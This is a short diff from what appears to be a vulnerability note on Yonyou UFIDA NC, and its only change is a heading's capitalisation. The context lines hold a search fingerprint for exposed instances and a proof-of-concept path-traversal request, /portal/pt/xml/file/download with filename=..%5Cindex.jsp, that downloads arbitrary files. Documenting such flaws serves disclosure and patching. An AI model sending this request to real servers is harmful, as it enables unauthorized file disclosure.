@@ -7,7 +7,7 @@
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 ```
 /portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp
 ```
